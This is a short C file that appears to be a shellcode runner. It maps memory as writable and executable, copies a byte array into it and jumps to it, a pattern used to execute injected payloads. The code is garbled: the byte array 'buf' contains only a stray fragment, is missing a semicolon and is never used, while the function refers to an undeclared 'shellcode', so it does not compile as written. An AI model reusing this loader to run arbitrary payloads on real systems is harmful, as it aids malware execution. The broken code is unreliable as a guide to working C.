#include <sys/mman.h>
#include <string.h>
#include <unistd.h>

unsigned char buf[] = 
	"\x31,,,,"

void execute_shellcode() {
    size_t shellcode_size = sizeof(shellcode);

    void* exec = mmap(NULL, shellcode_size, PROT_READ | PROT_WRITE | PROT_EXEC,
                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    if (exec == MAP_FAILED) {
        _exit(1); 
    }

    memcpy(exec, shellcode, shellcode_size);

    void (*func)();
    func = (void (*)())exec;
    func();
}

int main() {
    execute_shellcode();
    return 0;
}
